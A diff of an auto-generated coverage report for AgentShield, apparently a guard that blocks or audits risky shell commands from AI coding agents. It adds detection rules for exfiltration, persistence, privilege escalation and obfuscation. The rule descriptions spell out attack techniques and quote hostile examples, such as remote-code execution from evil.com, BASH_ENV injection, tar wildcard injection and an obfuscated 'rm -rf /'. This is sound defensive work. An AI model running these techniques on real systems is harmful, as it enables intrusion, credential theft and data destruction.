@@ -1,20 +1,20 @@
 # AgentShield Coverage Report
 
-*Auto-generated on 2026-03-17 by `go run ./cmd/coverage`*
+*Auto-generated on 2026-03-18 by `go run ./cmd/coverage`*
 
 ## Summary
 
 | Metric | Count |
 |--------|-------|
-| Terminal rules | 361 |
+| Terminal rules | 438 |
 | MCP rules | 105 |
-| Total rules | 466 |
-| Test cases (TP+TN) | 1164 |
+| Total rules | 543 |
+| Test cases (TP+TN) | 1411 |
 | Kingdoms covered | 9 |
 
 ## Runtime Rules by Kingdom
 
-### credential-exposure (42 rules)
+### credential-exposure (46 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -60,8 +60,12 @@
 | `ts-block-script-quiet-record` | BLOCK | regex | script -q (quiet mode) silently records all terminal I/O without displaying the 'Script started' banner — used to covertly capture passwords, API keys, and MFA codes from subsequent interactive commands. MITRE T1056.001. |
 | `ts-block-script-capture-command` | BLOCK | regex | script -c '<command>' records all I/O of the specified command including credentials entered during SSH, sudo, or GPG prompts. The recording file contains cleartext passwords. MITRE T1056.001. |
 | `ts-audit-script-record` | AUDIT | regex | script command recording terminal session to a file — may capture credentials entered in subsequent interactive commands. MITRE T1056.001. |
+| `ts-block-git-credential-helper-exec` | BLOCK | regex | git config credential.helper with '!' prefix runs arbitrary shell command as credential helper — steals git credentials on every authenticated operation. MITRE T1556. |
+| `ts-block-curl-file-protocol` | BLOCK | regex | curl with file:// protocol reads local files — can access /etc/shadow, SSH keys, credentials without triggering file-read rules. Often chained with pipe to exfiltrate. MITRE T1005. |
+| `ts-block-wget-file-protocol` | BLOCK | regex | wget with file:// protocol reads local files to disk — saves sensitive files like SSH keys or shadow to attacker-specified path. MITRE T1005. |
+| `ts-block-git-askpass-env` | BLOCK | regex | GIT_ASKPASS sets a program invoked to prompt for credentials — attacker replaces it with a script that steals passwords. MITRE T1556. |
 
-### data-exfiltration (62 rules)
+### data-exfiltration (74 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -106,6 +110,11 @@
 | `ne-audit-ruby-http-server` | AUDIT | regex | Ruby one-liner HTTP file server detected (ruby -run -e httpd). Exposes the current directory to network peers. Review whether this was triggered by a prompt injection attack. MITRE T1105. |
 | `ne-audit-php-server` | AUDIT | regex | PHP built-in HTTP server detected (php -S). Serves the current directory over the network. Binding to 0.0.0.0 makes files accessible to any network peer — confirm this is intentional. MITRE T1105. |
 | `ne-audit-busybox-httpd` | AUDIT | regex | BusyBox httpd file server detected. Often used in containers to expose directories. An AI agent starting busybox httpd may be creating a covert data staging channel. MITRE T1105. |
+| `ne-block-doh-exfil-google` | BLOCK | regex | DNS-over-HTTPS exfiltration via Google DoH API. Data exfiltrated as DNS queries over HTTPS bypasses all traditional DNS monitoring and existing DNS tunneling rules. An AI agent has no legitimate need to call DoH resolver APIs. MITRE T1071.004, T1048.003. |
+| `ne-block-doh-exfil-cloudflare` | BLOCK | regex | DNS-over-HTTPS exfiltration via Cloudflare DoH API (cloudflare-dns.com). Exfiltrates data as DNS queries tunneled through HTTPS, invisible to port-53 monitoring. MITRE T1071.004, T1048.003. |
+| `ne-block-doh-exfil-one-dot` | BLOCK | regex | DNS-over-HTTPS exfiltration via Cloudflare 1.1.1.1 DoH endpoint. Data hidden in DNS query names travels over HTTPS, bypassing all DNS-layer exfiltration detection. MITRE T1071.004, T1048.003. |
+| `ne-block-doh-exfil-quad9` | BLOCK | regex | DNS-over-HTTPS exfiltration via Quad9 DoH endpoint. Tunnels DNS queries through HTTPS to bypass traditional DNS monitoring. MITRE T1071.004, T1048.003. |
+| `ne-block-doh-exfil-generic` | BLOCK | regex | DNS-over-HTTPS request detected via content type header (application/dns-json or application/dns-message). Any DoH request from an AI agent is suspicious — DNS lookups should use standard tools. MITRE T1071.004, T1048.003. |
 | `sec-block-base64-sensitive` | BLOCK | regex | Base64 encoding of credential files is a common exfiltration technique. |
 | `sec-block-xxd-sensitive` | BLOCK | regex | Hex dumping credential files is a potential exfiltration technique. |
 | `sec-block-scripting-lang-credential-encode` | BLOCK | regex | Scripting-language inline base64 encoding of credential files is an evasion technique used when the base64 binary is restricted. MITRE T1027. |
@@ -127,6 +136,13 @@
 | `ts-audit-xattr-write` | AUDIT | regex | Writing extended attributes to a file — xattrs are invisible to standard tools and can hide arbitrary data. Legitimate for metadata tagging, but AI agents rarely need this. MITRE T1564.004. |
 | `ts-block-procsub-output-network` | BLOCK | regex | Output process substitution >(network_tool) silently redirects data to a network tool without a visible pipe. Equivalent to 'cmd \| curl' but evades pipe-based detection. Used for covert data exfiltration. MITRE T1048. |
 | `ts-audit-find-exec-network` | AUDIT | regex | find -exec with a network tool detected — could be used to exfiltrate matched files. While some legitimate uses exist (e.g., uploading build artifacts), the combination of file discovery with network egress warrants review. MITRE T1048. |
+| `ts-block-coproc-network` | BLOCK | regex | coproc with a network tool creates a persistent bidirectional channel that evades pipe-based detection. Unlike 'cmd \| nc', the coproc channel persists across commands — data can be fed to it later without any visible pipe, making exfiltration chains invisible to single-command analysis. MITRE T1048. |
+| `ts-block-coproc-fd-write` | BLOCK | regex | Writing to a COPROC file descriptor (${COPROC[1]}) sends data to whatever coprocess is running — typically a network tool for exfiltration. This is the data-feeding half of a coproc-based stealth channel. MITRE T1048. |
+| `ts-audit-coproc` | AUDIT | regex | coproc (coprocess) usage detected. While legitimate uses exist (parallel processing, interactive tool wrappers), coproc is rarely used in normal development and can establish stealth bidirectional channels. MITRE T1048. |
+| `ts-block-shm-credential-stage` | BLOCK | regex | Copying credential or sensitive file to /dev/shm — data staging in world-readable tmpfs for later exfiltration. RAM-only storage leaves no disk forensic trace. MITRE T1074.001. |
+| `ts-block-shm-archive-sensitive` | BLOCK | regex | Archiving sensitive files/directories into /dev/shm — compresses credentials into a world-readable tmpfs staging area for bulk exfiltration. MITRE T1074.001. |
+| `ts-block-shm-redirect-sensitive` | BLOCK | regex | Redirecting sensitive file content to /dev/shm — stages credentials in world-readable shared memory. RAM-only, cleared on reboot, evades disk forensics. MITRE T1074.001. |
+| `ts-audit-shm-hidden-file` | AUDIT | regex | Writing a hidden (dot-prefixed) file to /dev/shm — hidden files in shared memory are a common staging tactic to avoid casual detection. Auditing for review. MITRE T1074.001. |
 
 ### destructive-ops (37 rules)
 
@@ -170,7 +186,7 @@
 | `ts-block-truncate-large` | BLOCK | regex | truncate creating a sparse file >=1GB — even sparse files consume inode metadata and can cause df to report full disk, breaking applications that check available space. MITRE T1499.001. |
 | `ts-audit-fallocate` | AUDIT | regex | fallocate detected — can instantly allocate arbitrary disk space. Legitimate for swap files and database pre-allocation, but dangerous in untrusted contexts. MITRE T1499.001. |
 
-### persistence-evasion (38 rules)
+### persistence-evasion (69 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -212,8 +228,39 @@
 | `ts-block-history-file-clear` | BLOCK | regex | Truncating shell history file — destroys forensic record of agent commands (LLM02). MITRE T1070.003. |
 | `ts-block-log-file-clear` | BLOCK | regex | System log file truncation or clearing detected — destroys authentication, audit, and security event records (LLM02, LLM08). MITRE T1070.002. |
 | `ts-audit-symlink-system-files` | AUDIT | regex | Creating a symlink to a system file — may be part of a TOCTOU race condition or filesystem redirect attack. CWE-367. |
+| `ts-block-shell-env-startup-export` | BLOCK | regex | Exporting BASH_ENV or ENV causes bash/sh to source the specified file before every non-interactive shell invocation — silently injecting code into all subshells, scripts, and command substitutions. MITRE T1546.004. |
+| `ts-block-shell-env-startup-inline` | BLOCK | regex | Inline BASH_ENV/ENV assignment before a command (e.g., BASH_ENV=/tmp/evil.sh bash -c '...') injects arbitrary code execution into the target shell invocation. MITRE T1546.004. |
+| `ts-block-prompt-command-export` | BLOCK | regex | Exporting PROMPT_COMMAND causes bash to execute the value as a command before every prompt display — ideal for persistent beaconing, credential harvesting, or keylogging. Fires on every Enter keystroke. MITRE T1546.004. |
+| `ts-block-prompt-command-assign` | BLOCK | regex | Setting PROMPT_COMMAND to a value containing a network or execution command installs a persistent hook that fires before every prompt. Even without export, it persists in the current shell session. MITRE T1546.004. |
+| `ts-block-trap-debug` | BLOCK | regex | trap DEBUG executes attacker code BEFORE every command in the shell — enables transparent credential interception, command rewriting, and keylogging. Fires on every single command without visible side effects. MITRE T1546.004. |
+| `ts-block-trap-exit-exfil` | BLOCK | regex | trap EXIT with network/execution commands — deferred exfiltration or code execution on shell exit. Data collected during session is exfiltrated when monitoring attention is lowest. MITRE T1546.004, T1041. |
+| `ts-block-trap-err-intercept` | BLOCK | regex | trap ERR with network/execution/escalation commands — intercepts error contexts which often contain credentials in error messages, or silently retries failed commands with escalated privileges. MITRE T1546.004. |
+| `ts-block-trap-signal-suppress` | BLOCK | regex | Ignoring termination signals (trap '' SIGTERM) makes processes unkillable by normal means — an agent-spawned background process becomes immune to cleanup. MITRE T1562.006. |
+| `ts-audit-trap-pseudo-signal` | AUDIT | regex | trap with pseudo-signal (DEBUG/EXIT/ERR/RETURN) — these hooks fire automatically on shell events and can be used for persistent code injection. Auditing for review. MITRE T1546.004. |
+| `ts-block-func-shadow-security-cmd` | BLOCK | regex | Defining a shell function that shadows a security-sensitive command (sudo, ssh, curl, etc.) — enables transparent credential interception. The original command still works via 'command' builtin, making the attack invisible to users. MITRE T1546.004, T1056.001. |
+| `ts-block-export-func-shadow` | BLOCK | regex | Exporting a function that shadows a security command propagates the shadow to ALL child processes — a single export -f sudo infects every subshell, script, and tool invocation. MITRE T1546.004. |
+| `ts-block-func-body-exfil` | BLOCK | regex | Function definition containing network exfiltration or encoding commands in its body — regardless of function name, embedding curl/wget/nc in a function body is a strong signal of credential interception or data exfiltration. MITRE T1041. |
+| `ts-audit-func-command-passthrough` | AUDIT | regex | Function definition using 'command' builtin for passthrough — classic pattern of a transparent function shadow that intercepts then delegates to the real command. Auditing for review. MITRE T1546.004. |
+| `ts-block-mkfifo-reverse-shell` | BLOCK | regex | mkfifo combined with shell or netcat — classic FIFO-based reverse shell pattern. The named pipe enables bidirectional communication between a shell and a network listener. MITRE T1059.004. |
+| `ts-block-mkfifo-exfil` | BLOCK | regex | mkfifo combined with a file transfer tool — data written to the FIFO by one process is streamed to the network by another. Splits the exfiltration chain across processes to evade pipe detection. MITRE T1071.001. |
+| `ts-block-mkfifo-volatile` | BLOCK | regex | Creating a named pipe in a volatile/world-writable path — covert channels placed in /tmp or /dev/shm are cleaned on reboot, reducing forensic evidence. MITRE T1071.001. |
+| `ts-audit-mkfifo` | AUDIT | regex | Creating a named pipe (FIFO) — legitimate uses exist but FIFOs are a classic covert channel mechanism. Auditing for review. |
+| `ts-block-exec-fd-network` | BLOCK | regex | exec with fd redirect to /dev/tcp or /dev/udp — opens a network connection using only bash builtins with zero external tools. Invisible to process-based network monitoring. Creates a bidirectional channel for C2 or exfiltration. MITRE T1059.004. |
+| `ts-block-exec-shell-norc` | BLOCK | regex | exec replacing the current shell with one that skips init files — bypasses .bashrc hooks, PROMPT_COMMAND monitoring, and shell-level security wrappers while keeping the same PID (invisible in ps). MITRE T1562.001. |
+| `ts-block-exec-fd-credential` | BLOCK | regex | exec opening a credential or sensitive file via file descriptor — reads sensitive data through an FD handle that may bypass path-based monitoring. The FD persists for later reads via cat <&N. CWE-200. |
+| `ts-audit-exec-fd-redirect` | AUDIT | regex | exec with numeric file descriptor redirect — may be used for covert channels, sensitive file access, or network connections via /dev/tcp. Auditing for review. |
+| `ts-block-git-config-sshcommand` | BLOCK | regex | git config core.sshCommand replaces the SSH binary for all remote git operations — attacker can execute arbitrary commands on every push/pull/fetch. MITRE T1574. |
+| `ts-block-git-config-pager` | BLOCK | regex | git config core.pager replaces the pager command for git log/diff/show — runs arbitrary command every time output is paged. MITRE T1574. |
+| `ts-block-git-config-fsmonitor` | BLOCK | regex | git config core.fsmonitor sets a command that runs automatically on every git status — persistent background code execution. CVE-2022-24765 abused this. MITRE T1546. |
+| `ts-block-git-config-textconv` | BLOCK | regex | git config diff.*.textconv sets a command that runs every time git diff encounters a matching file type — hidden code execution on routine diff operations. MITRE T1574. |
+| `ts-block-git-alias-shell` | BLOCK | regex | git config alias.* with '!' prefix creates a shell-command alias — 'git <alias>' will execute arbitrary shell commands. Attackers use this to trojanize common git workflows. MITRE T1546. |
+| `ts-block-git-ssh-command-env` | BLOCK | regex | GIT_SSH_COMMAND environment variable overrides the SSH binary for git operations — runs arbitrary commands on every push/pull/fetch. Even 'ssh -o ...' can be abused. MITRE T1574. |
+| `ts-block-memfd-create-python` | BLOCK | regex | Fileless execution via Python memfd_create — creates anonymous in-memory file descriptor for payload execution with zero disk artifacts. Used by APT-grade fileless malware. MITRE T1620. |
+| `ts-block-memfd-create-perl` | BLOCK | regex | Fileless execution via Perl memfd_create syscall — creates anonymous in-memory fd for payload execution without touching disk. MITRE T1620. |
+| `ts-block-memfd-create-generic` | BLOCK | regex | memfd_create detected — creates anonymous in-memory file descriptors for fileless payload execution. No legitimate use case for AI coding agents. MITRE T1620. |
+| `ts-block-proc-self-fd-exec` | BLOCK | regex | Execution via /proc/self/fd/<N> — typically follows memfd_create to execute fileless payloads from anonymous memory-backed file descriptors. MITRE T1620. |
 
-### privilege-escalation (40 rules)
+### privilege-escalation (50 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -257,6 +304,16 @@
 | `ts-audit-dyld-inject` | AUDIT | regex | macOS DYLD_ environment variable manipulation detected — legitimate for debugging but also used for library injection attacks. MITRE T1574.006. |
 | `ts-block-debugfs-command` | BLOCK | regex | debugfs with -R (run command), -w (writable mode), or -f (script file) operates at the block/inode level, bypassing all Unix file permissions, SELinux, and AppArmor. Can read /etc/shadow, modify files without timestamps, or inject payloads directly into the filesystem. MITRE T1006. |
 | `ts-audit-debugfs` | AUDIT | regex | debugfs filesystem debugger detected — operates below Unix permissions at the block/inode level. Even interactive mode can read protected files. MITRE T1006. |
+| `ts-block-runtime-code-inject-export` | BLOCK | regex | Exporting a runtime code injection env var (PYTHONSTARTUP, PERL5OPT, RUBYOPT, NODE_OPTIONS, JAVA_TOOL_OPTIONS) silently injects code into every subsequent invocation of that language runtime. Unlike search path vars, these execute code directly. MITRE T1574.007. |
+| `ts-block-runtime-code-inject-inline` | BLOCK | regex | Inline runtime code injection env var before a command — injects attacker code into the target process. Example: PERL5OPT='-e system("id")' perl script.pl executes arbitrary code before the script runs. MITRE T1574.007. |
+| `ts-audit-perl5opt` | AUDIT | regex | PERL5OPT is the most dangerous runtime env var — supports inline code execution via -e flag. Extremely rare in legitimate AI agent workflows. Any use warrants review. |
+| `ts-block-home-redirect` | BLOCK | regex | Redirecting HOME to a writable/volatile path hijacks config lookups for ssh, git, npm, pip, gpg, kubectl, and dozens more tools — a single env var poisons the trust root for all user-space configuration. MITRE T1574.007. |
+| `ts-block-home-redirect-inline` | BLOCK | regex | Inline HOME redirection before a security-sensitive tool — the tool reads attacker-controlled config (SSH keys, git hooks, npm registry, pip index, cloud credentials). MITRE T1574.007. |
+| `ts-block-xdg-redirect` | BLOCK | regex | Redirecting XDG_CONFIG_HOME or XDG_DATA_HOME to a writable path hijacks XDG-compliant config lookups for git, pip, and many other tools. Alternative attack vector to HOME redirection. MITRE T1574.007. |
+| `ts-block-wildcard-inject-checkpoint` | BLOCK | regex | Creating a file named '--checkpoint-action=...' — tar wildcard injection. When tar operates on *, glob expansion turns this filename into a flag that executes arbitrary commands at each checkpoint. CWE-88, MITRE T1059.004. |
+| `ts-block-wildcard-inject-checkpoint-marker` | BLOCK | regex | Creating a file named '--checkpoint=N' — tar wildcard injection marker. Used alongside --checkpoint-action to trigger command execution during tar operations. CWE-88. |
+| `ts-block-wildcard-inject-rsync-shell` | BLOCK | regex | Creating a file named '-e sh ...' — rsync wildcard injection. When rsync operates on *, this filename becomes the -e flag specifying a remote shell command. CWE-88. |
+| `ts-block-wildcard-inject-reference` | BLOCK | regex | Creating a file named '--reference=/etc/shadow' — chown/chmod wildcard injection. Glob expansion turns this into a flag that copies permissions from a privileged file. CWE-88. |
 
 ### reconnaissance (48 rules)
 
@@ -311,7 +368,7 @@
 | `ts-block-proc-mem-read` | BLOCK | regex | Reading /proc/PID/mem or /proc/PID/maps extracts raw process memory — can expose injected system prompts, in-heap API keys, and in-flight secrets (LLM07). MITRE T1057. |
 | `ts-audit-proc-environ-read` | AUDIT | regex | Reading /proc/PID/environ dumps the full process environment including injected system prompts and API keys — a more thorough context-window probe than printenv (LLM07). MITRE T1057. |
 
-### supply-chain (47 rules)
+### supply-chain (49 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -362,8 +419,10 @@
 | `sc-audit-vector-db-write` | AUDIT | regex | Python invocation writing to a vector database (ChromaDB/Pinecone/Weaviate/Qdrant/FAISS) — injecting adversarial documents into a RAG knowledge base poisons AI-grounded outputs. OWASP LLM08, MITRE AML.T0010. |
 | `sc-audit-vector-db-rest-write` | AUDIT | regex | curl POST/PUT to vector database REST API endpoint — injecting content into a RAG knowledge base via HTTP bypasses Python library detection. OWASP LLM08. |
 | `ts-struct-block-npm-registry` | BLOCK | structural | Structural: package install with custom registry override is a supply chain risk. |
+| `ts-block-make-shell-override` | BLOCK | regex | make SHELL= overrides the shell used for all recipe commands — attacker can inject a trojan shell that logs/modifies every build step. MITRE T1195.002. |
+| `ts-block-compiler-plugin-inject` | BLOCK | regex | Compiler/linker flag injection via build variables — -fplugin loads arbitrary shared objects during compilation, --wrap redirects function calls. MITRE T1195.002. |
 
-### unauthorized-execution (45 rules)
+### unauthorized-execution (63 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -412,6 +471,24 @@
 | `ts-block-procsub-input-exec` | BLOCK | regex | Input process substitution feeding remote content directly to an interpreter (e.g., bash <(curl evil.com)) — pipe-to-shell evasion without a visible pipe character. MITRE T1059. |
 | `ts-block-procsub-eval-remote` | BLOCK | regex | eval/exec consuming input process substitution from a remote downloader — executes unreviewed remote code via named pipe evasion. MITRE T1059. |
 | `ts-block-find-exec-shell` | BLOCK | regex | find with -exec/-execdir invoking a shell interpreter (sh -c, bash -c) enables arbitrary code execution over every matched file. Chains file discovery with unrestricted shell commands — can mass-modify, inject backdoors, or exfiltrate file contents at scale. MITRE T1059.004. |
+| `ts-block-ifs-eval-evasion` | BLOCK | regex | IFS manipulation followed by eval/exec — attacker changes how bash splits words to construct commands from obfuscated strings. The non-standard IFS causes seemingly innocent variable values to be split into executable + arguments. MITRE T1027.004. |
+| `ts-block-ifs-positional-evasion` | BLOCK | regex | IFS manipulation with positional parameter expansion (set --, $@, $*) or bare variable execution — splits a string by a custom delimiter and re-assembles it as command arguments. Classic shell obfuscation technique: IFS=.; x='rm.-rf./'; set -- $x; "$@" executes 'rm -rf /'. MITRE T1027.004. |
+| `ts-audit-ifs-manipulation` | AUDIT | regex | IFS set to a non-whitespace value — while sometimes legitimate (e.g., CSV parsing), this changes fundamental shell word splitting and may be used to evade command detection. MITRE T1027.004. |
+| `ts-block-eval-brace-expansion` | BLOCK | regex | eval/exec with brace expansion assembles commands from fragments at shell expansion time — the literal command string never contains the final dangerous command, evading regex-based detection. Example: 'eval {r,m} -rf /' assembles 'rm -rf /'. MITRE T1027.004. |
+| `ts-block-cmdsub-brace-eval` | BLOCK | regex | echo with brace expansion inside command substitution or eval constructs command names from fragments — $(echo {r,m}) produces 'rm'. Combines two layers of indirection to evade detection. MITRE T1027.004. |
+| `ts-block-brace-var-exec` | BLOCK | regex | Brace expansion result stored in a variable and then executed — two-stage command construction that first assembles the payload, then runs it. Evades single-pass detection. MITRE T1027.004. |
+| `ts-block-printf-hex-pipe-shell` | BLOCK | regex | printf with hex escape sequences piped to a shell interpreter — constructs and executes encoded commands, evading ANSI-C quoting detection. MITRE T1027.004. |
+| `ts-block-echo-hex-pipe-shell` | BLOCK | regex | echo -e with hex escape sequences piped to a shell — decodes hex bytes and executes the result as a command. MITRE T1027.004. |
+| `ts-block-printf-hex-eval` | BLOCK | regex | eval executing command-substituted printf with hex escapes — decodes and evaluates an obfuscated command string. MITRE T1027.004. |
+| `ts-block-printf-octal-pipe-shell` | BLOCK | regex | printf with octal escape sequences piped to a shell — constructs commands from octal-encoded bytes. MITRE T1027.004. |
+| `ts-audit-printf-hex-cmdsub` | AUDIT | regex | printf with hex escapes inside command substitution — may construct executable strings dynamically. Auditing because command substitution in non-eval context has legitimate uses (ANSI color codes). MITRE T1027.004. |
+| `ts-block-perl-pack-exec` | BLOCK | regex | Perl pack('H*',...) in one-liner decodes hex strings at runtime — reconstructs arbitrary commands invisible to static analysis. Used to evade shell command detection. MITRE T1027.013. |
+| `ts-block-python-fromhex-exec` | BLOCK | regex | Python bytes.fromhex() combined with exec/eval in one-liner — decodes hex-encoded commands at runtime, bypassing all regex-based detection. MITRE T1027.013. |
+| `ts-block-python-exec-fromhex` | BLOCK | regex | Python exec(bytes.fromhex(...)) in one-liner — hex-decodes and executes arbitrary code at runtime, completely invisible to shell-level command analysis. MITRE T1027.013. |
+| `ts-block-python-compile-bytes` | BLOCK | regex | Python compile(bytes([...])) in one-liner — reconstructs code from raw byte arrays at runtime. Evades all text-based detection since the payload is a numeric array. MITRE T1027.013. |
+| `ts-block-ruby-pack-exec` | BLOCK | regex | Ruby one-liner with byte pack('C*') feeding system/exec/eval — reconstructs commands from byte arrays at runtime. MITRE T1027.013. |
+| `ts-block-ruby-hex-exec` | BLOCK | regex | Ruby one-liner with system/exec/eval and hex escape sequences — \x.. escapes reconstruct commands invisible to static analysis. MITRE T1027.013. |
+| `ts-block-node-buffer-exec` | BLOCK | regex | Node.js Buffer.from(...,'hex') with exec/spawn in one-liner — hex-decodes commands at runtime to evade static detection. MITRE T1027.013. |
 
 ### uncategorized (2 rules)
 
@@ -582,12 +659,12 @@
 | Kingdom | TP | TN | Total |
 |---------|----|----|-------|
 | credential-exposure | 112 | 87 | 199 |
-| data-exfiltration | 93 | 58 | 151 |
+| data-exfiltration | 120 | 71 | 191 |
 | destructive-ops | 72 | 44 | 116 |
-| persistence-evasion | 76 | 40 | 116 |
-| privilege-escalation | 101 | 60 | 161 |
+| persistence-evasion | 141 | 80 | 221 |
+| privilege-escalation | 125 | 75 | 200 |
 | reconnaissance | 108 | 39 | 147 |
-| supply-chain | 61 | 41 | 102 |
-| unauthorized-execution | 104 | 68 | 172 |
-| **Total** | **727** | **437** | **1164** |
+| supply-chain | 68 | 46 | 114 |
+| unauthorized-execution | 134 | 89 | 223 |
+| **Total** | **880** | **531** | **1411** |
 
